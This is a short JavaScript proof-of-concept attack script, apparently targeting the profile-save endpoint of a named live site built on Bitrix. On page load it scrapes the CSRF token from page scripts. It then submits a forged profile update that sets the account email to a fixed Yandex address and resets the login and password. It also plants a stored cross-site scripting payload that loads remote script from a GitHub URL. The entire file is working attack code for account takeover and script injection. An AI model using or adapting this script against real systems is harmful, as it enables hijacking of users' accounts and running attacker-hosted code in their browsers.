 function getCSRFToken() {
  const scripts = document.getElementsByTagName('script');
  for (let script of scripts) {
    if (script.textContent.includes('bxSession.Expand')) {
      const tokenMatch = script.textContent.match(/bxSession\.Expand\('([^']+)'/);
      if (tokenMatch && tokenMatch[1]) {
        return tokenMatch[1].split('.')[0]; // "d43b6876f68547bb84ab757a7311b4fc"
      }
    }
  }
  return null;
}

function changeEmail(newEmail) {
  const csrfToken = getCSRFToken();
  if (!csrfToken) {
    alert('CSRF token not found!');
    return;
  }

  const formData = new FormData();
  
  
  formData.append('values[name]', 'SecurityTest1');
  formData.append('values[lastName]', '<script src=https://github.com/petya8bachey/csrf-attack/raw/refs/heads/main/poc.js></script>');
  formData.append('values[secondName]', '');
  formData.append('values[email]', 'spvdor@yandex.ru');
  formData.append('values[login]', 'test33');
  formData.append('values[password]', '123123');
  formData.append('values[confirmPassword]', '123123');

  fetch('https://archives.nobl.ru/local/templates/g3/components/openregion/user/.default/http/save.php', {
    method: 'POST',
    headers: {
      'X-Bitrix-Csrf-Token': csrfToken,
    },
    body: formData
  })
  .then(response => response.json())
  .then(data => {
    if(data.success) {
      alert(`Email успешно изменен на ${newEmail}`);
    } else {
      alert('Ошибка при изменении email: ' + (data.error || 'Неизвестная ошибка'));
    }
  })
  .catch(error => {
    console.error('Request failed:', error);
    alert('Сетевая ошибка');
  });
}

window.addEventListener('DOMContentLoaded', () => {
  changeEmail('spvdor@yandex.ru');
})
